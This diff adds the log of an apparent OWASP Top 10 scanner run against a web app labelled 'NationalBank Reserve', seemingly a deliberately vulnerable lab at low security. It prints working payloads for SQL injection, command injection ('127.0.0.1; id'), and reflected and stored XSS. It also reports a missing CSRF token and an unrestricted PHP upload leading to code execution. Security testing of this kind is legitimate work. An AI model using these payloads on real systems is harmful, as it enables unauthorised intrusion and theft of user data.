@@ -1,0 +1,68 @@
+============================================================
+NationalBank Reserve — OWASP Top 10 Tester
+Started: 2026-09-14 14:17:38
+============================================================
+
+[*] Fetching login page...
+[*] CSRF token: 64014a7bd6781828...
+[*] Sending login request...
+[+] Login successful
+[*] Setting security level to low...
+[+] Security level set to LOW
+
+============================================================
+A03: SQL INJECTION TEST
+============================================================
+[*] Testing: Normal query (id=1)
+[*] Normal result: 1 user(s) → ['admin']
+[*] Testing: SQL Injection (' OR '1'='1)
+[*] Injection result: 5 user(s) → ['admin', 'Gordon', 'Hack', 'Pablo', 'Bob']
+[+] SQLi CONFIRMED! Extracted 5 users via injection
+[+] Payload: 1' OR '1'='1
+
+============================================================
+A03: COMMAND INJECTION TEST
+============================================================
+[*] Testing: Normal ping (127.0.0.1)
+[*] Testing: Command Injection (127.0.0.1; id)
+[+] Command Injection CONFIRMED! uid=33(www-data)
+[+] Payload: 127.0.0.1; id
+
+============================================================
+A03: REFLECTED XSS TEST
+============================================================
+[*] Testing payload: <script>alert('XSS')</script>
+[+] Reflected XSS CONFIRMED! Payload reflected in response
+
+============================================================
+A03: STORED XSS TEST
+============================================================
+[*] Testing payload: <script>alert('StoredXSS')</script>
+[+] Stored XSS CONFIRMED! Payload persisted in guestbook
+
+============================================================
+A01: CSRF TEST
+============================================================
+[*] Checking password change form for CSRF token...
+[+] CSRF CONFIRMED! Password change form has NO CSRF token
+[+] Attack: Malicious page can change admin password silently
+
+============================================================
+A08: FILE UPLOAD TEST
+============================================================
+[*] Uploading test.php with PHP code...
+[+] File Upload CONFIRMED! PHP file uploaded without validation
+[+] Impact: Remote Code Execution possible
+
+============================================================
+SUMMARY
+============================================================
+  [+] VULNERABLE: A03-SQLi
+  [+] VULNERABLE: A03-CMDi
+  [+] VULNERABLE: A03-XSS-Reflected
+  [+] VULNERABLE: A03-XSS-Stored
+  [+] VULNERABLE: A01-CSRF
+  [+] VULNERABLE: A08-FileUpload
+
+Total vulnerabilities found: 6/6
+============================================================
